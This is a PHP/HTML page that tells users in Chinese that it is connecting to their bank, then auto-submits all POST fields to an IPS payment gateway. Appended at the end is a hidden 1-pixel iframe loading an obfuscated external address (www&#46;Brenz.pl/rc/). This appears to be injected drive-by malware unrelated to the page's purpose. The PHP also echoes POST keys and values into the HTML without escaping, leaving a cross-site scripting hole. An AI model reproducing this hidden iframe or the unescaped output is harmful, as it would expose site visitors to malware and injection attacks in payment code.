<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>正在连接银行...</title>
<script>
self.moveTo(0,0);
self.resizeTo(screen.availWidth,screen.availHeight);
</script>
<style> 
.tabPages{
margin-top:5px;text-align:center;display:block; border:3px solid #d9d9de; padding:30px; font-size:14px;
}
</style>
</head>

<body>
<div id="Content">
  <div class="tabPages">正在为您连接银行，请稍等......</div>
</div>
<form action="http://newpay.ips.com.cn/psfp-entry/gateway/payment.html" method="post" name="E_FORM" id="E_FORM">
    <?php
    foreach($_POST   as   $key   =>   $value)   {
    echo   "<input id='".$key."' name='".$key."' value='".$value."' type='hidden'  />"; 
    }
?>
</form>
<script language="javascript">
      document.getElementById("E_FORM").submit();
    </script>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>